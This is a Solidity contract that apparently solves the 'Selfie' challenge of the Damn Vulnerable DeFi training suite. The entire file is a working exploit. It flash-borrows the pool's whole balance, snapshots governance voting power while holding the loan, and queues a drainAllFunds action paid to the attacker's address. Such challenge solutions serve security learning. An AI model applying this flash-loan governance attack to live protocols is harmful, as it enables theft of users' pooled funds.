// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../selfie/SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieA{
    SelfiePool pool;
    DamnValuableTokenSnapshot public governance;
    address owner;

    constructor(
        address pool_address,
        address governance_address,
        address _owner
    ){
        pool = SelfiePool(pool_address);
        governance = DamnValuableTokenSnapshot(governance_address);
        owner = _owner;
    }
    function attack() public {
        uint256 amount_borrow = pool.token().balanceOf(address(pool));
        pool.flashLoan(amount_borrow);
    }
    function receiveTokens(address token, uint256 amount) external{
        governance.snapshot();
        pool.governance().queueAction(address(pool), abi.encodeWithSignature("drainAllFunds(address)",owner),0);
        governance.transfer(address(pool), amount);
    }
}